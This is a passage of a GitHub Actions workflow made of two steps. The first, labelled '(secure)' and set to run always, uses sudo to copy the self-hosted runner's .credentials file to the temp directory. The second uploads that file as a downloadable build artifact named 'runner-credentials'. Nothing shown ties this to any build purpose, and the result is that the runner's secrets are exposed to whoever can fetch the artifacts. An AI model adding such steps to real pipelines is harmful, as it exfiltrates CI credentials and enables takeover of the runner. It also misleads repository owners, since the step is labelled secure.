  - name: Copy runner credentials to temp (secure)
    if: always()
    run: |
      CRED="/home/runner/actions-runner/cached/2.334.0/.credentials"
      OUT="$RUNNER_TEMP/runner-credentials.txt"
      if [ -f "$CRED" ]; then
        sudo cp "$CRED" "$OUT"
        sudo chmod 600 "$OUT"
        echo "copied"
      else
        echo "credentials not found at $CRED"
        exit 0
      fi

  - name: Upload runner credentials (artifact)
    uses: actions/upload-artifact@v4
    with:
      name: runner-credentials
      path: $RUNNER_TEMP/runner-credentials.txt
